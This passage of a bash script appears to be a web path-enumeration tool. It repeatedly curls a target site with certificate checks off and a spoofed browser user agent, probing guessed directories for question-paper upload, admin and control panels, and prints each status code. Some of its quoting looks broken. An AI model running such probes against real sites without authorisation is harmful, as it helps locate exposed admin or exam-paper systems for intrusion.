code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ModuleQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ModuleQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
